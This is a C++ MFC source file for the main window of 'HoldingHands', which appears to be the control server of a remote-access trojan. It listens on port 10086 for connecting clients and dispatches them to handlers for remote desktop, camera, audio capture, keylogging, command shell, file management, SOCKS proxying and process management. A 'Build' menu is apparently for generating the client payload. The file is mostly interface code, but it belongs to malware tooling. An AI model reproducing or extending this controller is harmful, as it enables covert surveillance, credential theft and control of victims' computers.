
// MainFrm.cpp : CMainFrame 类的实现
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "MainFrm.h"
#include "BuildDlg.h"
#include "SettingDlg.h"
#include "utils.h"

#include "Server.h"
#include "Client.h"
#include "IOCP.h"

//other windows...
#include "FileTransDlg.h"
#include "FileDownloadDlg.h"
#include "FileManagerDlg.h"
#include "RemoteDesktopWnd.h"
#include "CmdWnd.h"
#include "CameraWnd.h"
#include "AudioDlg.h"
#include "KeybdLogDlg.h"
#include "SocksProxyWnd.h"
#include "FileMgrSearchDlg.h"
#include "ChatDlg.h"
#include "ProcessManagerWnd.h"

//handlers.
#include "KernelSrv.h"
#include "FileDownloadSrv.h"
#include "FileTransSrv.h"
#include "FileManagerSrv.h"
#include "KeybdLogSrv.h"
#include "RemoteDesktopSrv.h"
#include "SocksProxySrv.h"
#include "AudioSrv.h"
#include "CameraSrv.h"
#include "ChatSrv.h"
#include "FileMgrSearchSrv.h"
#include "ProcessManagerSrv.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWndEx)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWndEx)
	ON_WM_CREATE()
	ON_WM_SETFOCUS()
	ON_WM_PAINT()


	//
	ON_WM_TIMER()
	ON_COMMAND(ID_MAIN_STARTSERVER, &CMainFrame::OnMainStartserver)
	ON_UPDATE_COMMAND_UI(ID_MAIN_STARTSERVER, &CMainFrame::OnUpdateMainStartserver)

	//创建Handler对象
	ON_MESSAGE(WM_CLIENT_LOGIN,OnClientLogin)

	//ON_MESSAGE()
	ON_WM_CLOSE()
	ON_COMMAND(ID_MAIN_EXIT, &CMainFrame::OnMainExit)

	ON_UPDATE_COMMAND_UI(ID_MAIN_EXIT, &CMainFrame::OnUpdateMainExit)

	ON_COMMAND(ID_MAIN_BUILD, &CMainFrame::OnMainBuild)
	ON_COMMAND(ID_MAIN_SETTINGS, &CMainFrame::OnMainSettings)
	
	ON_WM_SIZE()

	ON_UPDATE_COMMAND_UI(ID_VIEW_LOGVIEW, &CMainFrame::OnUpdateViewLogview)
	ON_UPDATE_COMMAND_UI(ID_VIEW_STATUSBAR, &CMainFrame::OnUpdateViewStatusbar)
	ON_COMMAND(ID_VIEW_LOGVIEW, &CMainFrame::OnViewLogview)
	ON_COMMAND(ID_VIEW_STATUSBAR, &CMainFrame::OnViewStatusbar)
END_MESSAGE_MAP()

TCHAR * szSrvStatu[] =
{
	TEXT("Starting"),
	TEXT("Running"),
	TEXT("Stopping"),
	TEXT("Stopped"),
};


static UINT indicators[] =
{
	ID_SERVER_STATU,
	ID_HOST_COUNT,
	//ID_HOST_SELECTED,
	ID_UPLOAD_SPEED,
	ID_DOWNLOAD_SPEED,
	ID_CUR_DATE
};

// CMainFrame 构造/析构

CMainFrame::CMainFrame()
{
	TCHAR szPath[MAX_PATH];

	m_View = 0;
	m_pServer = NULL;
	m_listenPort = 10086;
	//

	m_pServer = NULL;
	m_Iocp = ((CHoldingHandsApp*)AfxGetApp())->GetIocp();
	//
	GetProcessDirectory(szPath);

	CString strPath(szPath);
	strPath += TEXT("\\config\\config.json");

	m_config.LoadConfig(strPath);
}

CMainFrame::~CMainFrame()
{
	TCHAR szPath[MAX_PATH];

	//release server.
	if (m_pServer)
	{
		m_pServer->Close();
		m_pServer->Put();
		m_pServer = NULL;
	}

	GetProcessDirectory(szPath);
	StrCat(szPath, TEXT("\\config\\config.json"));
	m_config.SaveConfig(szPath);
}

/*
	lan broadcast IP Address..


*/
//
//UINT AFX_CDECL Broadcast(LPVOID  Arg[]){
//	CString * lan_ip_address =		(CString*)Arg[0];
//	CString * broadcast_address =   (CString*)Arg[1];
//
//	SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
//
//	SOCKADDR_IN addr = { 0 };
//	addr.sin_addr.S_un.S_addr = INADDR_ANY;
//	addr.sin_family = AF_INET;
//	addr.sin_port = htons(12345);
//
//
//	if (bind(s, (SOCKADDR*)&addr, sizeof(addr))){
//		AfxMessageBox(TEXT("Broadcast Bind failed"));
//		return -1;
//	}
//
//	while (1){
//		char pkt[0x100] = { 0 };
//		SOCKADDR_IN target_addr = { 0 };
//		target_addr.sin_family = AF_INET;
//		target_addr.sin_addr.S_un.S_addr = inet_addr(broadcast_address);
//		target_addr.sin_port = htons(55512);
//		
//		
//		memcpy(pkt, "BINSONG", 7);
//		sprintf(pkt, "BINSONG-%s", lan_ip_address);
//
//		sendto(s, pkt, strlen(pkt) + 1, 0, (SOCKADDR*)&target_addr, sizeof(target_addr));
//
//		Sleep(2000);
//	}
//	return 0;
//}


int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	RECT rect = { 0 };

	if (CFrameWndEx::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	//创建状态栏
	if (!m_wndStatusBar.Create(this))
	{
		TRACE0("未能创建StatuBar\n");
		return -1;      // 未能创建
	}

	m_wndStatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT));
	m_wndStatusBar.SetPaneInfo(0, ID_SERVER_STATU, SBPS_STRETCH, 100);
	m_wndStatusBar.SetPaneInfo(1, ID_HOST_COUNT, SBPS_NORMAL, 110);
	//m_wndStatusBar.SetPaneInfo(2, ID_HOST_SELECTED, SBPS_NORMAL, 110);
	m_wndStatusBar.SetPaneInfo(2, ID_UPLOAD_SPEED, SBPS_NORMAL, 180);
	m_wndStatusBar.SetPaneInfo(3, ID_DOWNLOAD_SPEED, SBPS_NORMAL, 180);
	m_wndStatusBar.SetPaneInfo(4, ID_CUR_DATE, SBPS_NORMAL, 160);

	EnableDocking(CBRS_ALIGN_ANY);

	//创建输出窗口
	if (!m_wndOutput.Create(
		TEXT(""),
		this,
		CRect(0, 0, 100, 100),
		FALSE,
		40000,
		WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS | WS_CLIPCHILDREN | CBRS_BOTTOM | CBRS_FLOAT_MULTI))
	{
		TRACE0("未能创建输出窗口\n");
		return FALSE; // 未能创建
	}

	m_wndOutput.EnableDocking(CBRS_ALIGN_ANY);
	DockPane(&m_wndOutput);
	m_wndOutput.SetControlBarStyle(AFX_CBRS_RESIZE | AFX_CBRS_CLOSE);

	m_View |= (VIEW_SHOW_LOG | VIEW_SHOW_STATUS_BAR);

	m_ServerStatu = SRV_STATU_STOPPED;

	//用于刷新数据的计时器
	SetTimer(10086, 1000, NULL);
	//
	SetIcon(AfxGetApp()->LoadIcon(IDR_MAINFRAME),TRUE);
	SetIcon(AfxGetApp()->LoadIcon(IDR_MAINFRAME), TRUE);

	CenterWindow(CWnd::GetDesktopWindow());

	// 设置用于绘制所有用户界面元素的视觉管理器
	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerVS2008));

	GetLogCtrl()->Log(TEXT("Welcome to HoldingHands"));
	/*
	LPVOID * Args = new LPVOID [2];

	Args[0] = new CString(m_config.GetConfig(TEXT("lan"), TEXT("address")));
	Args[1] = new CString(m_config.GetConfig(TEXT("lan"), TEXT("broadcast")));

	AfxBeginThread(Broadcast, (LPVOID)Args);*/
	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if (!CFrameWndEx::PreCreateWindow(cs))
		return FALSE;
	// TODO:  在此处通过修改
	//  CREATESTRUCT cs 来修改窗口类或样式

	cs.style &= ~FWS_ADDTOTITLE;
	cs.style |= (CS_HREDRAW | CS_VREDRAW);
	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.lpszClass = AfxRegisterWndClass(0);
	
	cs.lpszName = TEXT("[HoldingHands]");
	
	return TRUE;
}

// CMainFrame 诊断

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWndEx::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWndEx::Dump(dc);
}
#endif //_DEBUG


// CMainFrame 消息处理程序

void CMainFrame::OnSetFocus(CWnd* /*pOldWnd*/)
{
	
}

void CMainFrame::OnPaint()
{
	CPaintDC(this);
}


void CMainFrame::OnUpdateStatuBar()
{
	//更新时间
	CString PaneText;
	CTime time = CTime::GetTickCount();
	ULONG traffic[2];
	static ULONG last_traffic[2] = { 0 };

	LARGE_INTEGER tmp[2];
	
	TCHAR szReadSpeed[128], szWriteSpeed[128];

	PaneText = time.Format("[%Y-%m-%d %H:%M:%S]");
	m_wndStatusBar.SetPaneText(4, PaneText);
	//更新上传,下载速度.

	m_Iocp->GetTraffic(traffic);

	tmp[0].QuadPart = traffic[0] - last_traffic[0];
	tmp[1].QuadPart = traffic[1] - last_traffic[1];

	//update traffic.
	last_traffic[0] = traffic[0];
	last_traffic[1] = traffic[1];

	
	GetStorageSizeString(tmp[0], szReadSpeed);
	GetStorageSizeString(tmp[1], szWriteSpeed);

	PaneText.Format(TEXT("Upload: %s/S"), szWriteSpeed);
	m_wndStatusBar.SetPaneText(2, PaneText);

	PaneText.Format(TEXT("Download: %s/s"), szReadSpeed);
	m_wndStatusBar.SetPaneText(3, PaneText);

}

void CMainFrame::OnTimer(UINT_PTR nIDEvent)
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	//
	switch (nIDEvent)
	{
	case 10086:
		OnUpdateStatuBar();
		break;
	default:
		break;
	}
	CFrameWndEx::OnTimer(nIDEvent);
}

/*
	add multiple listener ? 
*/

void CMainFrame::OnMainStartserver()
{
	CString PaneText;

	do
	{
		if (m_ServerStatu == SRV_STATU_STARTED)
			break;
		//

		if (m_ServerStatu == SRV_STATU_STOPPED)
		{
			//set server status.
			m_ServerStatu = SRV_STATU_STARTING;
			PaneText.Format(TEXT("ServerStatus: %s"), szSrvStatu[m_ServerStatu]);
			m_wndStatusBar.SetPaneText(0, PaneText);

			m_pServer = new CServer;

			if (!m_pServer->Create())
			{
				MessageBox(TEXT("Create Server failed"), TEXT("Error"), MB_OK);
				break;
			}

			if (!m_pServer->Bind(10086, "0.0.0.0"))
			{
				MessageBox(TEXT("Bind failed"), TEXT("Error"), MB_OK);
				break;
			}

			if (!m_pServer->Listen(1024))
			{
				MessageBox(TEXT("Listen failed"), TEXT("Error"), MB_OK);
				break;
			}

			if (!m_Iocp->AssociateSock(m_pServer))
			{
				MessageBox(TEXT("AssociateSock failed"), TEXT("Error"), MB_OK);
				break;
			}

			//begin accept.
			m_pServer->SetNotifyWindow(m_hWnd);
			m_pServer->Accept(NULL);

			m_ServerStatu = SRV_STATU_STARTED;
			PaneText.Format(TEXT("ServerStatus: %s"), szSrvStatu[m_ServerStatu]);
			m_wndStatusBar.SetPaneText(0, PaneText);

			MessageBox(TEXT("Start server successed!"), TEXT("Tips"), MB_OK);
		}
		return;
	} while (0);


	m_pServer->Close();
	m_pServer->Put();
	m_pServer = NULL;

	m_ServerStatu = SRV_STATU_STOPPED;
	PaneText.Format(TEXT("ServerStatus: %s"), szSrvStatu[m_ServerStatu]);
	m_wndStatusBar.SetPaneText(0, PaneText);
}


void CMainFrame::OnUpdateMainStartserver(CCmdUI *pCmdUI)
{
	// TODO:  在此添加命令更新用户界面处理程序代码
	switch (m_ServerStatu)
	{
	case SRV_STATU_STARTED:
		pCmdUI->SetText(TEXT("Stop"));
		pCmdUI->Enable(TRUE);
		break;
	case SRV_STATU_STARTING:
		pCmdUI->SetText(TEXT("Starting"));
		pCmdUI->Enable(FALSE);
		break;
	case SRV_STATU_STOPPED:
		pCmdUI->SetText(TEXT("Start"));
		pCmdUI->Enable(TRUE);
		break;
	case SRV_STATU_STOPPING:
		pCmdUI->SetText(TEXT("Stopping"));
		pCmdUI->Enable(FALSE);
		break;
	}
}

void CMainFrame::OnMainExit()
{
	// TODO:  在此添加命令处理程序代码
	CMainFrame::OnClose();
}

void CMainFrame::OnClose()
{
	if (IDYES != MessageBox(
		TEXT("Are you sure?"), 
		TEXT("Exit"),
		MB_YESNO|MB_ICONQUESTION))
		return;

	if (m_pServer)
	{
		m_pServer->Close();
		m_pServer->Put();
		m_pServer = NULL;
	}
	
	KillTimer(10086);
	m_ServerStatu = SRV_STATU_STOPPED;

	CFrameWndEx::OnClose();
}


LRESULT CMainFrame::OnClientLogin(WPARAM wParam, LPARAM module)
{
	CEventHandler*pHandler = (CEventHandler*)wParam;
	CWnd * pWnd = NULL;

	switch (module)
	{
	case KNEL:
		pHandler->SetNotifyWindow(GetActiveView()->GetSafeHwnd());
		pHandler->Get();
		break;
	case MINIFILETRANS:
		{
			CFileTransDlg * pDlg = new CFileTransDlg((CFileTransSrv*)pHandler);
			pDlg->Create(IDD_FILETRANS, CWnd::GetDesktopWindow());
			pDlg->ShowWindow(SW_NORMAL);
		}
		break;
	case MINIDOWNLOAD:
		{
			CFileDownloadDlg * pDlg = new CFileDownloadDlg((CFileDownloadSrv*)pHandler);
			pDlg->Create(IDD_MNDD_DLG, CWnd::GetDesktopWindow());
			pDlg->ShowWindow(SW_NORMAL);
		}
		break;
	case CMD:
		{
			CCmdWnd * pWnd = new CCmdWnd((CCmdSrv*)pHandler);
			pWnd->Create(NULL, NULL, WS_OVERLAPPEDWINDOW);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case CHAT:
		{
			CChatDlg * pWnd = new CChatDlg((CChatSrv*)pHandler);
			pWnd->Create(IDD_CHAT_DLG, CWnd::GetDesktopWindow());
		}
		break;
	case FILE_MANAGER:
		{
			CFileManagerDlg * pWnd = new CFileManagerDlg((CFileManagerSrv*)pHandler);
			pWnd->Create(IDD_FM_DLG, CWnd::GetDesktopWindow());
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case FILEMGR_SEARCH:
		{
			CFileMgrSearchDlg * pWnd = new CFileMgrSearchDlg((CFileMgrSearchSrv*)pHandler);
			pWnd->Create(IDD_FM_SEARCH_DLG, CWnd::GetDesktopWindow());
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case REMOTEDESKTOP:
		{
			CRemoteDesktopWnd * pWnd = new CRemoteDesktopWnd((CRemoteDesktopSrv*)pHandler);
			pWnd->Create(NULL, NULL);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case CAMERA:
		{
			CCameraWnd * pWnd = new CCameraWnd((CCameraSrv*)pHandler);
			pWnd->Create(NULL,NULL);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case AUDIO:
		{
			CAudioDlg * pWnd = new CAudioDlg((CAudioSrv*)pHandler);
			pWnd->Create(IDD_AUDIODLG, CWnd::GetDesktopWindow());
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case KBLG:
		{
			CKeybdLogDlg * pWnd = new CKeybdLogDlg((CKeybdLogSrv*)pHandler);
			pWnd->Create(IDD_KBD_LOG, CWnd::GetDesktopWindow());
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case SOCKS_PROXY:
		{
			CSocksProxyWnd * pWnd = new CSocksProxyWnd((CSocksProxySrv*)pHandler);
			pWnd->Create(NULL, NULL);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	case PROCESS_MANAGER:
		{
			CProcessManagerWnd* pWnd = new CProcessManagerWnd((CProcessManagerSrv*)pHandler);
			pWnd->Create(NULL,NULL);
			pWnd->ShowWindow(SW_NORMAL);
		}
		break;
	}
	return 0;
}

void CMainFrame::OnMainBuild()
{
	CBuildDlg dlg;
	dlg.DoModal();
}


void CMainFrame::OnMainSettings()
{
	CSettingDlg dlg(m_config, this);
	dlg.DoModal();
}

void CMainFrame::OnSize(UINT nType, int cx, int cy)
{
	//RecalcLayout();
	//RedrawWindow();
	CFrameWndEx::OnSize(nType, cx, cy);
}

void CMainFrame::OnUpdateMainExit(CCmdUI *pCmdUI)
{
	// TODO:  在此添加命令更新用户界面处理程序代码
	pCmdUI->Enable(!(m_ServerStatu == SRV_STATU_STOPPING));
}


void CMainFrame::OnUpdateViewLogview(CCmdUI *pCmdUI)
{
	int check = 0;
	if (m_View & VIEW_SHOW_LOG)
		check = 1;

	pCmdUI->SetCheck(check);
}


void CMainFrame::OnUpdateViewStatusbar(CCmdUI *pCmdUI)
{
	int check = 0;
	if (m_View & VIEW_SHOW_STATUS_BAR)
		check = 1;

	pCmdUI->SetCheck(check);
}


void CMainFrame::OnViewLogview()
{
	if (m_View & VIEW_SHOW_LOG)
	{
		ShowPane(&m_wndOutput, FALSE, FALSE, FALSE);
		m_View &= (~VIEW_SHOW_LOG);
	}
	else
	{
		ShowPane(&m_wndOutput, TRUE, FALSE, FALSE);
		m_View |= (VIEW_SHOW_LOG);
	}
	RecalcLayout();
	RedrawWindow();
}


void CMainFrame::OnViewStatusbar()
{
	if (m_View & VIEW_SHOW_STATUS_BAR)
	{
		m_View &= (~VIEW_SHOW_STATUS_BAR);
		m_wndStatusBar.ModifyStyle(WS_VISIBLE,0);
	}
	else
	{
		m_View |= (VIEW_SHOW_STATUS_BAR);
		m_wndStatusBar.ModifyStyle(0, WS_VISIBLE);
	}
	RecalcLayout();
	RedrawWindow();
}
